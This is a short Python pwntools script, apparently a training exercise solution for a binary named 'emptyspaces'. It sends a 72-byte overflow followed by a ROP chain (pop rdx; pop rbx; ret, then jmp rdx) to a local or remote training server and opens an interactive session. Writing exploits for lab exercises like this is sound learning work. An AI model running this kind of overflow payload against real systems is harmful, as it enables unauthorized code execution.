import time
from pwn import *

if "REMOTE" not in args:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/rop/4/emptyspaces')
else:
	r = remote("bin.training.jinblack.it", 2015)

code_base=0x400000

gdb.attach(r)

input("wait")

payload=b"a"*72
#0x00400190 empty space GNU stuff
emptyspace=0x00400190


####JUMP TO RAX AT EMPTYSPACE
#0x000000000008a3bc: pop rdx; pop rbx; ret; 
gadget1=code_base+0x008a3bc
payload+=p64(gadget1)
payload+=p64(emptyspace)
payload+=p64(0)
#0x00000000004b2cbb: jmp rdx; 

payload+=p64(0x04b2cbb)

r.send(payload)
r.interactive()



